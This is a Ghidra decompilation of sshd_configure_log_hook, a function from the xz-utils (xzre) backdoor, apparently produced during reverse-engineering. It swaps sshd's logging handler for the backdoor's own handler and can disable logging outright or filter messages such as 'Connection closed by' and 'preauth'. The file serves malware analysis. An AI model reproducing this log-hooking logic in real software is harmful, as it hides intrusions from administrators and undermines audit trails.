// /home/kali/xzre-ghidra/xzregh/107DE0_sshd_configure_log_hook.c
// Function: sshd_configure_log_hook @ 0x107DE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_configure_log_hook(cmd_arguments_t * cmd_flags, global_context_t * ctx)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief configure the log hook
 *
 *   @param cmd_flags flags controlling the log hook configuration
 *   @param ctx the global context
 */

BOOL sshd_configure_log_hook(cmd_arguments_t *cmd_flags,global_context_t *ctx)

{
  byte bVar1;
  sshd_log_ctx_t *psVar2;
  ulong *puVar3;
  void *pvVar4;
  ulong *puVar5;
  ulong *puVar6;
  byte bVar7;
  
  psVar2 = ctx->sshd_log_ctx;
  if (((((cmd_flags == (cmd_arguments_t *)0x0) || (psVar2 == (sshd_log_ctx_t *)0x0)) ||
       (puVar6 = (ulong *)psVar2->log_handler_ptr, puVar6 == (ulong *)0x0)) ||
      ((puVar3 = (ulong *)psVar2->log_handler_ctx_ptr, puVar3 == (ulong *)0x0 ||
       (psVar2->mm_log_handler == (_func_63 *)0x0)))) || (psVar2->log_hooking_possible == 0)) {
    return 0;
  }
  bVar1 = cmd_flags->flags1;
  bVar7 = bVar1 & 8;
  if ((bVar7 == 0) || (ctx->uid == 0)) {
    pvVar4 = (void *)*puVar3;
    puVar5 = puVar3;
    if ((pvVar4 != (void *)0x0) &&
       ((ctx->sshd_code_start <= pvVar4 && (pvVar4 < ctx->sshd_code_end)))) {
      psVar2->log_handler_ptr = puVar3;
      psVar2->log_handler_ctx_ptr = puVar6;
      puVar5 = puVar6;
      puVar6 = puVar3;
    }
    pvVar4 = (void *)*puVar5;
    psVar2->orig_log_handler = (log_handler_fn)*puVar6;
    psVar2->orig_log_handler_ctx = pvVar4;
    if (bVar7 == 0) {
      psVar2->logging_disabled = 1;
    }
    else if ((bVar1 & 0x10) != 0) {
      if (psVar2->STR_percent_s == (char *)0x0) {
        return 0;
      }
      if (psVar2->STR_Connection_closed_by == (char *)0x0) {
        return 0;
      }
      if (psVar2->STR_preauth == (char *)0x0) {
        return 0;
      }
    }
    *puVar6 = (ulong)psVar2->mm_log_handler;
  }
  return 1;
}

